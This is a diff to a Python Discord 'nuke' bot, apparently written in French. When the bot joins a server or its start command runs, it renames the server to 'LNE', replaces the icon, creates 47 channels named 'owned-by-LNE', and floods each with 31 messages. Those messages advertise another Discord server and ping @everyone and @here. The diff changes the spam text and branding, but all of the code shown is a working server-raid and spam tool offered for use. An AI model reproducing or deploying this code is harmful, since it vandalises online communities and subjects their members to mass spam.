@@ -23,9 +23,18 @@ async def start_http_server():
 
 NOMBRE_DE_SALONS = 47
 MESSAGES_PAR_SALON = 31 
-TEXTE = " 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp  je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp je t bz slppppp     https://discord.gg/GQ3SZfumD @everyone @here"
+TEXTE = """ 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 
+ 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 
+ 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 
+
+https://discord.gg/GQ3SZfumD
+
+ 𝐒𝐄𝐑𝐕𝐄𝐔𝐑 𝐎𝐖𝐍𝐄𝐃 𝐁𝐘 𝐁𝐎𝐑𝐃𝐄𝐑𝐋𝐈𝐍𝐄 
+ 𝐆𝐈𝐕𝐄𝐀𝐖𝐀𝐘 𝐁𝐎𝐓 𝐍𝐔𝐊𝐄 𝐕𝐈𝐏 𝐄𝐍 𝐂𝐎𝐔𝐑𝐒 
+
+@everyone @here"""
 VIDEO_PATH_1 = "copy_35D81FA1-AB32-45DC-8F6C-5F25B99A16B8.mov"
-VIDEO_PATH_2 = "copy_35D81FA1-AB32-45DC-8F6C-5F25B99A16B8.mov"
+VIDEO_PATH_2 = "copy_8412EB05-CB3D-4E60-9841-00113F106054.mov"
 
 @bot.event
 async def on_ready():
@@ -64,14 +73,14 @@ async def start_command(interaction: discord.Interaction):
     if os.path.exists("IMG_2976.png"):
         with open("IMG_2976.png", "rb") as f:
             try:
-                await guild.edit(name="Borderline", icon=f.read())
+                await guild.edit(name="LNE", icon=f.read())
             except:
                 pass
 
     tasks = []
     for i in range(1, NOMBRE_DE_SALONS + 1):
         try:
-            ch = await guild.create_text_channel(name="owned-by-borderline")
+            ch = await guild.create_text_channel(name="owned-by-LNE")
             tasks.append(asyncio.create_task(spam_channel(ch)))
         except:
             continue
@@ -90,14 +99,14 @@ async def on_guild_join(guild: discord.Guild):
     if os.path.exists("IMG_2976.png"):
         with open("IMG_2976.png", "rb") as f:
             try:
-                await guild.edit(name="Borderline", icon=f.read())
+                await guild.edit(name="LNE", icon=f.read())
             except:
                 pass
 
     tasks = []
     for i in range(1, NOMBRE_DE_SALONS + 1):
         try:
-            ch = await guild.create_text_channel(name="owned-by-borderline")
+            ch = await guild.create_text_channel(name="owned-by-LNE")
             tasks.append(asyncio.create_task(spam_channel(ch)))
         except:
             continue
